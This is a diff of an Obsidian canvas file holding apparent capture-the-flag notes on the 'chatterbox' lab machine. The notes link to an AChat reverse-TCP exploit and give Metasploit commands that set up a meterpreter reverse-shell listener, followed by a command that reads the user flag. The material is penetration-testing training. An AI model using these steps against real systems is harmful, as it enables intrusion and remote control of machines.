@@ -2,15 +2,15 @@
 	"nodes":[
 		{"id":"d6f2a7bd96fe58bb","type":"file","file":"chatterbox/attachments/Pasted image 20250206213019.png","x":-520,"y":-160,"width":400,"height":135},
 		{"id":"609bc29ec9fb0a82","type":"text","text":"139/445","x":-480,"y":-280,"width":250,"height":60},
-		{"id":"d9e4569da5793da5","x":140,"y":-160,"width":400,"height":400,"type":"link","url":"https://www.exploit-db.com/exploits/36025"},
-		{"id":"b549503d58df4641","x":600,"y":-160,"width":400,"height":400,"type":"link","url":"https://github.com/mpgn/AChat-Reverse-TCP-Exploit/blob/master/AChat_Exploit.py"},
-		{"id":"d5ff2648c7e08ba6","x":675,"y":270,"width":250,"height":60,"type":"text","text":"modification that gives us reverse shell!"},
-		{"id":"5532e82799d25895","x":600,"y":500,"width":400,"height":59,"type":"file","file":"chatterbox/attachments/Pasted image 20250207152408.png"},
-		{"id":"e8435a45583b770d","x":600,"y":680,"width":400,"height":285,"type":"file","file":"chatterbox/attachments/Pasted image 20250207152907.png"},
-		{"id":"2839e2fa93b4cc51","x":546,"y":1020,"width":509,"height":219,"type":"text","text":"msfconsole> use multi/handler\nmsfconsole> set payload windows/meterpreter/reverse_tcp\nmsfconsole> show options\n--SNIP--\nmsfconsole> set RHOST tun0\nmsfconsole> set RPORT 1234\nmsfconsole> run\n"},
-		{"id":"39a3eca162b7510a","x":435,"y":1401,"width":585,"height":99,"type":"text","text":"type /users/alfred/desktop/user.txt"},
-		{"id":"83884de624eb522b","x":600,"y":1280,"width":400,"height":98,"type":"file","file":"chatterbox/attachments/Pasted image 20250207154612.png"},
-		{"id":"3b361f793a6a85be","x":1240,"y":680,"width":514,"height":260,"type":"file","file":"chatterbox/attachments/Pasted image 20250207160642.png"}
+		{"id":"d9e4569da5793da5","type":"link","url":"https://www.exploit-db.com/exploits/36025","x":140,"y":-160,"width":400,"height":400},
+		{"id":"b549503d58df4641","type":"link","url":"https://github.com/mpgn/AChat-Reverse-TCP-Exploit/blob/master/AChat_Exploit.py","x":600,"y":-160,"width":400,"height":400},
+		{"id":"d5ff2648c7e08ba6","type":"text","text":"modification that gives us reverse shell!","x":675,"y":270,"width":250,"height":60},
+		{"id":"5532e82799d25895","type":"file","file":"chatterbox/attachments/Pasted image 20250207152408.png","x":600,"y":500,"width":399,"height":59},
+		{"id":"e8435a45583b770d","type":"file","file":"chatterbox/attachments/Pasted image 20250207152907.png","x":600,"y":680,"width":400,"height":285},
+		{"id":"2839e2fa93b4cc51","type":"text","text":"msfconsole> use multi/handler\nmsfconsole> set payload windows/meterpreter/reverse_tcp\nmsfconsole> show options\n--SNIP--\nmsfconsole> set RHOST tun0\nmsfconsole> set RPORT 1234\nmsfconsole> run\n","x":546,"y":1020,"width":509,"height":219},
+		{"id":"39a3eca162b7510a","type":"text","text":"type /users/alfred/desktop/user.txt","x":435,"y":1401,"width":585,"height":99},
+		{"id":"83884de624eb522b","type":"file","file":"chatterbox/attachments/Pasted image 20250207154612.png","x":600,"y":1280,"width":400,"height":98},
+		{"id":"3b361f793a6a85be","type":"file","file":"chatterbox/attachments/Pasted image 20250207160642.png","x":1240,"y":680,"width":514,"height":260}
 	],
 	"edges":[]
 }
